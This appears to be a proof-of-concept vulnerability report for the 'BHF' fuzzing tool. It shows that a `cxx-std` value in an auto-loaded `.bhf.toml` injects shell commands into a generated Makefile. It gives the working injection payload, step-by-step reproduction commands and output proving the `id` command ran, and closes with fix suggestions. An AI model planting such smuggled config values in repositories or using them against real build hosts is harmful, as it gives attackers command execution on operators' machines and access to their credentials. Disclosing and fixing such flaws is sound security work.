# BHF — command execution from a scanned tree, no opt-in flag

Proof of concept: a source tree that BHF (`Tarmo-Technologies/bhf`, "Build Harness
Fuzz") is pointed at can run arbitrary commands on the host during a plain `bhf auto`
run, using nothing but a `.bhf.toml` file placed at the tree root. No
build-execution flag (`--build-command`, `--run-untrusted`,
`--unsafe-search-and-run-build-commands`, `--probe-build`) is used.

- **Target:** `https://github.com/Tarmo-Technologies/bhf`
- **Version:** `bhf` 0.2.31 (git `0f69381`)
- **Vulnerable field:** `cxx-std` in an auto-loaded `.bhf.toml`
- **Result:** attacker-chosen shell command runs as the user who ran `bhf auto`

## Why it happens

BHF auto-loads a `.bhf.toml` from the root of the scanned tree and treats a small
set of "safe" knobs from it as trusted, `cxx-std` among them. The build-executing
knobs are gated behind explicit operator consent; `cxx-std` is not.

The `cxx-std` value is validated by prefix only — it just has to *start with*
`c++` or `gnu++` (`crates/cli/src/auto/cli.rs`), and any trailing text is kept. It is
then written verbatim into the generated C++ harness Makefile:

```
crates/harness_gen/src/templates/harness.makefile.cpp.tera:31
    CXX_STD ?= {{ cxx_standard }}
```

The template does not escape or quote the value. `CXX_STD` is expanded into
`CXXFLAGS` as `-std=$(CXX_STD)`, and `CXXFLAGS` is expanded into the `main:` compile
recipe, which `make` executes through `/bin/sh`. So shell metacharacters in
`cxx-std` become shell syntax in a command `make` runs. `bhf` invokes `make main`
with no `CXX_STD=` override, so the attacker's template default is what fires.

A value of the form:

```
cxx-std = "c++17; <command>; true"
```

passes the prefix check (`c++17…`), and the `;` separators turn `<command>` into its
own command in the recipe. The trailing `; true` absorbs the compiler arguments the
recipe appends after `$(CXX_STD)` so the injected command runs cleanly (a `#` comment
would be stripped by `make`, hence `true`).

The two principals are different: the **attacker** authors the scanned tree and has
no account or privilege on the BHF host; what they gain is command execution on the
**operator's** machine — the CI runner or analyst host that clones and fuzzes the
tree, along with whatever it holds (tokens, credentials, other source).

## Files in this PoC

| Path | Purpose |
|------|---------|
| `malicious_tree/parser.cpp` | a trivial C++ source so BHF generates a C++ harness to build |
| `malicious_tree/.bhf.toml`  | the payload: `cxx-std` carrying a shell command |
| `run.sh`                    | builds `bhf`, runs it on `malicious_tree/`, prints the proof |

`malicious_tree/.bhf.toml`:

```toml
cxx-std = "c++17; touch ./PWNED; id > ./PWNED.id 2>&1; true"
```

## Reproduce

Requirements: the C++ lane's ordinary tools — `make` and a C/C++ compiler
(`g++`/`clang++`) — plus a Rust toolchain to build `bhf`.

### 1. Build BHF from source

```sh
git clone https://github.com/Tarmo-Technologies/bhf.git
cd bhf
cargo build --release -p bhf --bin bhf
cd ..
```

### 2. Run the default pipeline against the malicious tree (no opt-in flag)

```sh
./bhf/target/release/bhf auto malicious_tree \
    --work-dir work --per-target-time 5 --jobs 1
```

BHF reports a normal, successful run — it exits 0 and prints `Findings: 0`. Nothing
signals that a command ran:

```
bhf auto: loaded config from .../malicious_tree/.bhf.toml
[   2/   2] H-X0005-... check_name → built+fuzzed
BHF findings
  Findings:     0
BHF auto summary
  Mode:         reporting
  Targets:      2 discovered — 2 built+fuzzed
```

### 3. Confirm host command execution

```sh
find work -name PWNED.id -exec cat {} \;
grep -n 'CXX_STD ?=' work/harnesses/*/Makefile
```

The injected `id` ran as the operator, and the generated Makefile carries the
payload verbatim:

```
uid=1000(dan) gid=1005(dan) groups=1005(dan),20(dialout),24(cdrom),...,1003(docker),1004(podman)

work/harnesses/H-X0005-.../Makefile:31:CXX_STD ?= c++17; touch ./PWNED; id > ./PWNED.id 2>&1; true
```

A one-shot script, `run.sh`, does all three steps.

## Differential (the tree config is the source)

Swap only the `cxx-std` string in `malicious_tree/.bhf.toml`; nothing else changes:

| `.bhf.toml` `cxx-std` value | Result |
|---|---|
| *(file absent)* | build succeeds, no `PWNED` file |
| `gnu++20` | build succeeds, no `PWNED` file (well-formed value, honored, harmless) |
| `c++17; id > ./PWNED.id; true` | build succeeds, `PWNED.id` contains `uid=…` |

Command execution tracks the tree's own config string, not the operator's command
line.

## Fix direction

- Validate `cxx-std` as a closed set (e.g. `^(c|gnu)\+\+[0-9]{2}[ab]?$`), not a prefix.
- Escape or single-quote every tree-sourced value that lands in a Makefile recipe
  instead of splicing it raw (the same applies to `extra-include`, which reaches the
  same recipe via `-iquote`).
- Hold build-influencing knobs from an auto-loaded tree config to the same trust gate
  as the execute-y knobs.
